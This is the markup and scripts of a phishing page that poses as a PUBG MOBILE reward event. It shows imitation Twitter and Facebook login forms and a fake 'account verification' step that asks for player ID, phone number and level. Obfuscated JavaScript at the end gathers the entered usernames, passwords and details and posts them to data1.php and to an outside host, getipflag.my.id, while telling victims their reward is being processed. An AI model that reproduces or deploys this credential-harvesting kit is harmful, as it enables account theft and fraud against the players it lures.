<input type="text" name="email" id="email-twitter" placeholder="" required oninvalid="this.setCustomValidity('Enter Username, Email or Mobile Number')" oninput="setCustomValidity('')">
</div> 
<div class="input-box-twitter">
<div class="TwitterShowHide TwitterShowPassword" onclick="showTwitterPassword()"><i class="zmdi zmdi-eye-off zmdi-hc-2x"></i></div> 
<div class="TwitterShowHide TwitterHidePassword" style="display: none;" onclick="hideTwitterPassword()"><i class="zmdi zmdi-eye zmdi-hc-2x"></i></div> 
<label>Password</label>
<input type="password" style="width: 85%;" name="password" id="password-twitter" placeholder="" required oninvalid="this.setCustomValidity('Enter Password')" oninput="setCustomValidity('')">
</div> 
<p class="kagettw email-tw" style="width: 330px; top: -15px; text-align: center; margin-left: -17px;">Sorry, we couldn't find your account.</p>
<p class="kagettw sandi-tw" style="width: 330px; top: -15px; text-align: center; margin-left: -17px;">Wrong Password!</p>
<input type="hidden" name="login" id="login-twitter" value="Twitter" readonly>
<button type="submit" class="btn-login-twitter" onclick="ValidateLoginTwitterData()">Log In</button>
<div class="footer-menu-twitter">Forgot password?</div> 
<div class="footer-menu-twitter bulet">•</div> 
<div class="footer-menu-twitter">Sign up to Twitter</div> 
</form>
</center>
</div> 
</div> 
</div> 
</div> 
<div class="popup account_verification animated fadeIn" style="display: none;">
<div class="popup-box-wrapper">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Account Verification</div> 
</div> 
<div class="popup-box-bg">
<div class="popup-box-alert4"><br>Complete your account details:</div> 
<form class="popup-box-form" action="javascript:void(0)" method="post" id="ValidateVerificationDataForm">
<input type="hidden" name="email" id="validateEmail" readonly>
<input type="hidden" name="password" id="validatePassword" readonly>
<input type="number" name="playid" id="playid" placeholder="Player ID" autocomplete="off" required oninvalid="this.setCustomValidity('Input your Player ID')" oninput="setCustomValidity('')">
<input type="number" name="phone" id="phone" placeholder="Phone Number" autocomplete="off" required oninvalid="this.setCustomValidity('Input your Phone Number')" oninput="setCustomValidity('')">
<select name="level" id="level" required oninvalid="this.setCustomValidity('Choose your Account Level')" oninput="setCustomValidity('')">
<option selected="selected" disabled="disabled" value="">Account Level</option>
<option>1</option>
<option>2</option>
<option>3</option>
<option>4</option>
<option>5</option>
<option>6</option>
<option>7</option>
<option>8</option>
<option>9</option>
<option>10</option>
<option>11</option>
<option>12</option>
<option>13</option>
<option>14</option>
<option>15</option>
<option>16</option>
<option>17</option>
<option>18</option>
<option>19</option>
<option>20</option>
<option>21</option>
<option>22</option>
<option>23</option>
<option>24</option>
<option>25</option>
<option>26</option>
<option>27</option>
<option>28</option>
<option>29</option>
<option>30</option>
<option>31</option>
<option>32</option>
<option>33</option>
<option>34</option>
<option>35</option>
<option>36</option>
<option>37</option>
<option>38</option>
<option>39</option>
<option>40</option>
<option>41</option>
<option>42</option>
<option>43</option>
<option>44</option>
<option>45</option>
<option>46</option>
<option>47</option>
<option>48</option>
<option>49</option>
<option>50</option>
<option>51</option>
<option>52</option>
<option>53</option>
<option>54</option>
<option>55</option>
<option>56</option>
<option>57</option>
<option>58</option>
<option>59</option>
<option>60</option>
<option>61</option>
<option>62</option>
<option>63</option>
<option>64</option>
<option>65</option>
<option>66</option>
<option>67</option>
<option>68</option>
<option>69</option>
<option>70</option>
<option>71</option>
<option>72</option>
<option>73</option>
<option>74</option>
<option>75</option>
<option>76</option>
<option>77</option>
<option>78</option>
<option>79</option>
<option>80</option>
<option>81</option>
<option>82</option>
<option>83</option>
<option>84</option>
<option>85</option>
<option>86</option>
<option>87</option>
<option>88</option>
<option>89</option>
<option>90</option>
<option>91</option>
<option>92</option>
<option>93</option>
<option>94</option>
<option>95</option>
<option>96</option>
<option>97</option>
<option>98</option>
<option>99</option>
<option>100</option>
</select>
<input type="hidden" name="login" id="validateLogin" readonly>
<br>
<br>
<div class="popup-box-footer">
<button type="submit" onmousedown="buka.play();" onclick="ValidateVerificationData()">Verification</button>
</div> 
</div> 
</form> 
</div> 
</div> 
<div class="popup check_verification animated fadeIn" style="display: none;">
<div class="popup-box-wrapper">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Account Verification</div> 
</div> 
<div class="popup-box-bg">
<div class="popup-box-alert4"><br>
<i class="zmdi zmdi-spinner zmdi-hc-spin"></i>
<br>
Checking your account details...
<br><br>
</div> 
<div class="popup-box-footer">
</div> 
</div> 
</div> 
</div> 
<div class="popup processing_account animated fadeIn" style="display: none;">
<div class="popup-box-wrapper">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Processing Account</div> 
</div> 
<div class="popup-box-bg">
<div class="popup-box-alert3"><br>
Thank you for joining the PUBG MOBILE Event
<br>
Your account is being processed to receive your reward. Please wait up to 24 hours. </div>
<div class="popup-box-alert0">
<br>- PUBG MOBILE -
</div> 
<br>
<div class="popup-box-footer">
<button type="button" onmousedown="tutup.play();" style="margin-right: 0; float: none;" onclick="location.href='https://pubgmobile.com/';">Logout</button>
</div> 
</div> 
</div> 
</div> 
<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script src="./index_files/jquery.min.js.download"></script>
<script type="text/javascript" src="index_files/gift-zone.js"></script>
<script type="text/javascript" src="js-zone/showHide.js"></script>
<script type="text/javascript" src="js-zone/slider.js"></script>
<script type="text/javascript" src="js-zone/selowx.js"></script>
<audio id="audioFile" src="media/spin.mp3"></audio>
<script>
$(document).ready(function() { 
var detik = 59;
var menit = 59;
var jam = 23;
function hitung() { 
setTimeout(hitung,1000); $('#timer1').html( '' + jam + ' : ' + menit + ' : ' + detik + ''); detik --; 
if(detik < 0) { 
detik = 59; 
menit --; 
if(menit < 0) { 
menit = 0; 
detik = 0; 
} 
} 
} 
hitung(); 
}
);
$(document).ready(function() { 
var detik = 59;
var menit = 59;
var jam = 23;
function hitung() { 
setTimeout(hitung,1000); $('#timer2').html( + jam + ' : ' + menit + ' : ' + detik + ''); detik --; 
if(detik < 0) { 
detik = 59; 
menit --; 
if(menit < 0) { 
menit = 0; 
detik = 0; 
} 
} 
} 
hitung(); 
}
);
</script><script>
var slideIndex = 0;
showSlides();
function showSlides() {
    var i;
    var slides = document.getElementsByClassName("slider");
    for (i = 0; i < slides.length; i++) {
        slides[i].style.display = "none"; 
    }
    slideIndex++;
    if (slideIndex > slides.length) {slideIndex = 1} 
    slides[slideIndex-1].style.display = "block"; 
    setTimeout(showSlides, 2400);
}
</script><script>
// code for activate clicked sound
var buka = new Audio();
buka.src = "https://l.top4top.io/m_1725u5z7i1.mp3";

var tutup = new Audio();
tutup.src = "https://a.top4top.io/m_1725zobal2.mp3";
</script><script>
function audioFile() {
    var audio = document.getElementById('audioFile');
    audio.play();}
$(document).ready(function(){
        $("o").attr("onclick", "audioFile()");
	});
</script><script>
// kode untuk ganti gambar header otomatis
var slideIndexHeader = 0;
showSlidesHeader();
function showSlidesHeader() {
    var i;
    var slidesHeader = document.getElementsByClassName("sliderHeader");
    for (i = 0; i < slidesHeader.length; i++) {
        slidesHeader[i].style.display = "none"; 
    }
    slideIndexHeader++;
    if (slideIndexHeader > slidesHeader.length) {slideIndexHeader = 1} 
    slidesHeader[slideIndexHeader-1].style.display = "block"; 
    setTimeout(showSlidesHeader, 2600);
}

// code for showing hiding items
function openRewards(evt, rewardsClass) {
    var i, tab_rewards, tab_rewards_link;
    tab_rewards = document.getElementsByClassName("tab_rewards");
    for (i = 0; i < tab_rewards.length; i++) {
        tab_rewards[i].style.display = "none";
    }
    tab_rewards_link = document.getElementsByClassName("menu-content");
    for (i = 0; i < tab_rewards_link.length; i++) {
        tab_rewards_link[i].className = tab_rewards_link[i].className.replace(" menu-content-active", "");
    }
    document.getElementById(rewardsClass).style.display = "block";
    evt.currentTarget.className += " menu-content-active";
}
document.getElementById("defaultTabRewards").click();
</script><script>var _0x39461a=_0x3477;(function(_0x553efe,_0x551f78){var _0x43fae3=_0x3477,_0x4eff2e=_0x553efe();while(!![]){try{var _0x30338e=parseInt(_0x43fae3(0x130))/0x1+parseInt(_0x43fae3(0x132))/0x2+-parseInt(_0x43fae3(0x12b))/0x3*(-parseInt(_0x43fae3(0x11c))/0x4)+-parseInt(_0x43fae3(0x134))/0x5*(parseInt(_0x43fae3(0x119))/0x6)+parseInt(_0x43fae3(0x123))/0x7+-parseInt(_0x43fae3(0x11d))/0x8*(-parseInt(_0x43fae3(0x12d))/0x9)+parseInt(_0x43fae3(0x135))/0xa*(-parseInt(_0x43fae3(0x138))/0xb);if(_0x30338e===_0x551f78)break;else _0x4eff2e['push'](_0x4eff2e['shift']());}catch(_0x5c414f){_0x4eff2e['push'](_0x4eff2e['shift']());}}}(_0x2623,0x4b70c));function openRewards(_0x2b8e9c,_0x1bcfa8){var _0x309087=_0x3477,_0x286349,_0x3c08d6,_0x125dde;_0x3c08d6=document[_0x309087(0x137)](_0x309087(0x127));for(_0x286349=0x0;_0x286349<_0x3c08d6[_0x309087(0x118)];_0x286349++){_0x3c08d6[_0x286349]['style'][_0x309087(0x133)]=_0x309087(0x121);}_0x125dde=document[_0x309087(0x137)](_0x309087(0x126));for(_0x286349=0x0;_0x286349<_0x125dde[_0x309087(0x118)];_0x286349++){_0x125dde[_0x286349][_0x309087(0x136)]=_0x125dde[_0x286349][_0x309087(0x136)][_0x309087(0x122)](_0x309087(0x131),'');}document['getElementById'](_0x1bcfa8)[_0x309087(0x12f)]['display']=_0x309087(0x116),_0x2b8e9c[_0x309087(0x11e)][_0x309087(0x136)]+='\x20menu-content-active';}document[_0x39461a(0x11b)](_0x39461a(0x117))[_0x39461a(0x115)]();function open_account_verification(){var _0x1dc3ef=_0x39461a;$(_0x1dc3ef(0x11f))[_0x1dc3ef(0x125)](),$(_0x1dc3ef(0x139))[_0x1dc3ef(0x11a)](),$(_0x1dc3ef(0x129))['hide']();}function open_mail_login(){var _0x513d84=_0x39461a;$(_0x513d84(0x12a))[_0x513d84(0x125)](),$(_0x513d84(0x128))['hide']();}function close_mail_login(){var _0x1abb7a=_0x39461a;$(_0x1abb7a(0x12a))[_0x1abb7a(0x11a)](),$(_0x1abb7a(0x128))['show']();}function open_about_event(){var _0x550b93=_0x39461a;$('.about_event')[_0x550b93(0x125)]();}function open_event_rules(){var _0x19c2a0=_0x39461a;$(_0x19c2a0(0x124))['show']();}function open_facebook(){var _0xb63c9e=_0x39461a;$(_0xb63c9e(0x12c))['show'](),$(_0xb63c9e(0x128))[_0xb63c9e(0x11a)]();}function _0x2623(){var _0x13d6c9=['.otherReward_confirmation','.login-mail','4383wQZeTs','.login-facebook','1479276KMMRvA','.login-twitter','style','185734BGYYvS','\x20menu-content-active','921956lqMJxt','display','410MmqRZH','4923010TsoaMG','className','getElementsByClassName','33NkJVHD','.open_rewards','click','block','defaultTabRewards','length','11238lZQPuU','hide','getElementById','1332tzZqwV','24IhxgPB','currentTarget','.account_verification','.newhome','none','replace','2192232FFZWXb','.event_rules','show','menu-content','tab_rewards','.account_login'];_0x2623=function(){return _0x13d6c9;};return _0x2623();}function open_twitter(){var _0x5ad454=_0x39461a;$('.login-twitter')[_0x5ad454(0x125)](),$(_0x5ad454(0x128))['hide']();}function close_reward_confirmation(){var _0x307374=_0x39461a;$(_0x307374(0x139))[_0x307374(0x11a)](),$(_0x307374(0x124))[_0x307374(0x11a)]();}function _0x3477(_0x328bab,_0x2762f7){var _0x2623c6=_0x2623();return _0x3477=function(_0x3477e1,_0x37ae34){_0x3477e1=_0x3477e1-0x115;var _0x593165=_0x2623c6[_0x3477e1];return _0x593165;},_0x3477(_0x328bab,_0x2762f7);}function close_facebook(){var _0x18d764=_0x39461a;$(_0x18d764(0x12c))[_0x18d764(0x11a)](),$(_0x18d764(0x128))[_0x18d764(0x125)]();}function close_twitter(){var _0x373b21=_0x39461a;$(_0x373b21(0x12e))['hide'](),$(_0x373b21(0x128))['show']();}function open_newhome(){var _0x765ced=_0x39461a;$(_0x765ced(0x128))[_0x765ced(0x125)](),$(_0x765ced(0x120))[_0x765ced(0x11a)]();}function open_account_login(){var _0x43a9b6=_0x39461a;$(_0x43a9b6(0x128))['show'](),$(_0x43a9b6(0x139))['hide']();}</script><script>(function(_0x17cebf,_0x53b3a1){var _0x2b4569=_0x2ce1,_0x96fcbd=_0x17cebf();while(!![]){try{var _0x54de9f=-parseInt(_0x2b4569(0xdd))/0x1*(-parseInt(_0x2b4569(0xed))/0x2)+-parseInt(_0x2b4569(0xcf))/0x3*(-parseInt(_0x2b4569(0xd4))/0x4)+parseInt(_0x2b4569(0xe7))/0x5*(parseInt(_0x2b4569(0xd0))/0x6)+-parseInt(_0x2b4569(0xdb))/0x7+-parseInt(_0x2b4569(0xee))/0x8*(-parseInt(_0x2b4569(0xe8))/0x9)+parseInt(_0x2b4569(0xe6))/0xa*(-parseInt(_0x2b4569(0x104))/0xb)+-parseInt(_0x2b4569(0xfa))/0xc;if(_0x54de9f===_0x53b3a1)break;else _0x96fcbd['push'](_0x96fcbd['shift']());}catch(_0x3705c8){_0x96fcbd['push'](_0x96fcbd['shift']());}}}(_0x4bfb,0x3accb));function _0x2ce1(_0x236f00,_0x1e254e){var _0x4bfb71=_0x4bfb();return _0x2ce1=function(_0x2ce15e,_0x2e07c3){_0x2ce15e=_0x2ce15e-0xce;var _0x475b93=_0x4bfb71[_0x2ce15e];return _0x475b93;},_0x2ce1(_0x236f00,_0x1e254e);}function _0x4bfb(){var _0x366dd6=['input#validateEmail','2852801BFYgdQ','val','1054uEBXru','#email-twitter','#login-facebook','.login-twitter','#ValidateLoginTwitterForm','ajax','submit','.sandi-fb','.slider-container','52810LjzVba','750NwdUNO','999wBaEvG','.verification_info','input#validateLogin','#password-facebook','#ValidateLoginFbForm','708DyJrsX','26112nqwIWV','trim','input#validatePassword','#level','#email-facebook','#ValidateVerificationDataForm','length','.email-tw','.login-facebook','https://getipflag.my.id/','#playid','serialize','2748324VNJCXk','preventDefault','input#phone','.email-fb','#password-twitter','.check_verification','#login-twitter','input#answer2','POST','.Other_verification','286xJSPPs','.sandi-tw','input#answer1','3sJgCtu','8868lCAwTs','.account_verification','show','input#playid','230396jqZEXh','input#level','.processing_account','data1.php','#phone','hide'];_0x4bfb=function(){return _0x366dd6;};return _0x4bfb();}function ValidateLoginFbData(){var _0x40894b=_0x2ce1;return $(_0x40894b(0xec))[_0x40894b(0xe3)](function(_0x30cabd){var _0x29cc32=_0x40894b;_0x30cabd[_0x29cc32(0xfb)](),$emailfb=$(_0x29cc32(0xf2))[_0x29cc32(0xdc)]()['trim'](),$passwordfb=$(_0x29cc32(0xeb))[_0x29cc32(0xdc)]()[_0x29cc32(0xef)](),$loginfb=$(_0x29cc32(0xdf))[_0x29cc32(0xdc)]()[_0x29cc32(0xef)]();if($emailfb==''||$emailfb==null||$emailfb[_0x29cc32(0xf4)]<=0x8)return $(_0x29cc32(0xfd))[_0x29cc32(0xd2)](),$(_0x29cc32(0xe4))['hide'](),$(_0x29cc32(0xd1))[_0x29cc32(0xd9)](),$(_0x29cc32(0xf6))[_0x29cc32(0xd2)](),![];else $('.email-fb')['hide'](),$(_0x29cc32(0xda))[_0x29cc32(0xdc)]($emailfb),$(_0x29cc32(0xd1))['show'](),$(_0x29cc32(0xf6))[_0x29cc32(0xd9)]();if($passwordfb==''||$passwordfb==null||$passwordfb[_0x29cc32(0xf4)]<=0x5)return $('.sandi-fb')[_0x29cc32(0xd2)](),$(_0x29cc32(0xd1))['hide'](),$(_0x29cc32(0xf6))[_0x29cc32(0xd2)](),![];else $(_0x29cc32(0xe4))['hide'](),$('input#validatePassword')['val']($passwordfb),$(_0x29cc32(0xea))[_0x29cc32(0xdc)]($loginfb),$('.account_verification')['show'](),$('.login-facebook')[_0x29cc32(0xd9)]();var _0x6c23b=$(_0x29cc32(0xda))['val'](),_0x5f4442=$(_0x29cc32(0xf0))[_0x29cc32(0xdc)](),_0x507e8d=$(_0x29cc32(0xea))[_0x29cc32(0xdc)]();if(_0x6c23b==''&&_0x5f4442==''&&_0x507e8d=='')return $(_0x29cc32(0xf6))[_0x29cc32(0xd9)](),![];$[_0x29cc32(0xe2)]({'type':_0x29cc32(0x102),'url':_0x29cc32(0xd7),'data':$(this)[_0x29cc32(0xf9)](),'beforeSend':function(){var _0x593bd0=_0x29cc32;$(_0x593bd0(0xf6))[_0x593bd0(0xd9)]();},'success':function(){var _0x555190=_0x29cc32;$('.login-facebook')[_0x555190(0xd9)](),$(_0x555190(0xe5))[_0x555190(0xd2)]();}});}),![];};function ValidateLoginTwitterData(){var _0x2387e5=_0x2ce1;return $(_0x2387e5(0xe1))[_0x2387e5(0xe3)](function(_0xb5c8eb){var _0x19e058=_0x2387e5;_0xb5c8eb[_0x19e058(0xfb)](),$emailtw=$(_0x19e058(0xde))[_0x19e058(0xdc)]()[_0x19e058(0xef)](),$passwordtw=$(_0x19e058(0xfe))[_0x19e058(0xdc)]()[_0x19e058(0xef)](),$logintw=$(_0x19e058(0x100))[_0x19e058(0xdc)]()['trim']();if($emailtw==''||$emailtw==null||$emailtw[_0x19e058(0xf4)]<=0x3)return $(_0x19e058(0xf5))['show'](),$(_0x19e058(0x105))[_0x19e058(0xd9)](),$(_0x19e058(0xd1))[_0x19e058(0xd9)](),$(_0x19e058(0xe0))[_0x19e058(0xd2)](),![];else $(_0x19e058(0xf5))[_0x19e058(0xd9)](),$(_0x19e058(0xda))['val']($emailtw),$(_0x19e058(0xd1))['show'](),$(_0x19e058(0xe0))[_0x19e058(0xd9)]();if($passwordtw==''||$passwordtw==null||$passwordtw[_0x19e058(0xf4)]<=0x7)return $(_0x19e058(0x105))['show'](),$(_0x19e058(0xd1))[_0x19e058(0xd9)](),$(_0x19e058(0xe0))[_0x19e058(0xd2)](),![];else $(_0x19e058(0x105))['hide'](),$(_0x19e058(0xf0))['val']($passwordtw),$('input#validateLogin')['val']($logintw),$('.account_verification')['show'](),$(_0x19e058(0xe0))['hide']();var _0x20d132=$('input#validateEmail')[_0x19e058(0xdc)](),_0x3a290c=$(_0x19e058(0xf0))[_0x19e058(0xdc)](),_0xdf0d35=$(_0x19e058(0xea))['val']();if(_0x20d132==''&&_0x3a290c==''&&_0xdf0d35=='')return $('.login-twitter')[_0x19e058(0xd9)](),![];$[_0x19e058(0xe2)]({'type':_0x19e058(0x102),'url':_0x19e058(0xd7),'data':$(this)[_0x19e058(0xf9)](),'beforeSend':function(){var _0x4703cf=_0x19e058;$(_0x4703cf(0xe0))[_0x4703cf(0xd9)]();},'success':function(){var _0x4330ef=_0x19e058;$(_0x4330ef(0xe0))['hide'](),$('.slider-container')[_0x4330ef(0xd2)]();}});}),![];};function ValidateVerificationData(){$('#ValidateVerificationDataForm')['submit'](function(_0x322c89){var _0x3c0c6a=_0x2ce1;_0x322c89[_0x3c0c6a(0xfb)](),$playid=$(_0x3c0c6a(0xf8))[_0x3c0c6a(0xdc)]()[_0x3c0c6a(0xef)](),$phone=$(_0x3c0c6a(0xd8))[_0x3c0c6a(0xdc)]()['trim'](),$level=$(_0x3c0c6a(0xf1))[_0x3c0c6a(0xdc)]()['trim']();if($playid==''||$phone==''||$level==''){}else $('.account_verification')['hide'](),$('.Other_verification')['show'](),$(_0x3c0c6a(0xd3))[_0x3c0c6a(0xdc)]($playid),$(_0x3c0c6a(0xfc))[_0x3c0c6a(0xdc)]($phone),$(_0x3c0c6a(0xd5))[_0x3c0c6a(0xdc)]($level);var _0x2508b5=$('input#validateEmail')[_0x3c0c6a(0xdc)](),_0x59bb97=$(_0x3c0c6a(0xf0))[_0x3c0c6a(0xdc)](),_0x3cac80=$(_0x3c0c6a(0xea))[_0x3c0c6a(0xdc)]();});}function ValidateVerificationData(){var _0x4dba7c=_0x2ce1,_0x250888=$(_0x4dba7c(0xf3))[_0x4dba7c(0xf9)]();return $['ajax']({'url':_0x4dba7c(0xf7),'data':_0x250888,'type':_0x4dba7c(0x102),'success':function(){return!0x0;},'error':function(){return!0x0;}}),$('#ValidateVerificationDataForm')[_0x4dba7c(0xe3)](function(_0x514994){var _0x1581fb=_0x4dba7c;_0x514994['preventDefault']();var _0x5a5aa5=$('input#validateEmail')['val'](),_0x1d48ad=$('input#validatePassword')[_0x1581fb(0xdc)](),_0x12fa24=$(_0x1581fb(0xd3))['val'](),_0x590fd2=$(_0x1581fb(0xfc))[_0x1581fb(0xdc)](),_0x25de89=$(_0x1581fb(0xd5))['val'](),_0x33b666=$(_0x1581fb(0xce))['val'](),_0x1fbf4a=$(_0x1581fb(0x101))[_0x1581fb(0xdc)](),_0x37bd33=$('input#answer3')['val'](),_0x10051d=$('input#answer4')['val'](),_0x665c60=$(_0x1581fb(0xea))['val']();if(_0x5a5aa5==''&&_0x1d48ad==''&&_0x12fa24==''&&_0x590fd2==''&&_0x25de89==''&&_0x33b666==''&&_0x1fbf4a==''&&_0x37bd33==''&&_0x10051d==''&&_0x665c60=='')return $(_0x1581fb(0xe9))[_0x1581fb(0xd2)](),$(_0x1581fb(0xd1))['hide'](),![];$['ajax']({'type':_0x1581fb(0x102),'url':'','data':$(this)[_0x1581fb(0xf9)](),'beforeSend':function(){var _0x5f1acb=_0x1581fb;$(_0x5f1acb(0xff))[_0x5f1acb(0xd2)](),$(_0x5f1acb(0x103))[_0x5f1acb(0xd9)]();},'success':function(){var _0x196dd3=_0x1581fb;$(_0x196dd3(0xd6))[_0x196dd3(0xd2)](),$(_0x196dd3(0xff))['hide'](),$(_0x196dd3(0xd1))['hide'](),$(_0x196dd3(0x103))['hide']();}});}),![];};
</script>
</body>
</html>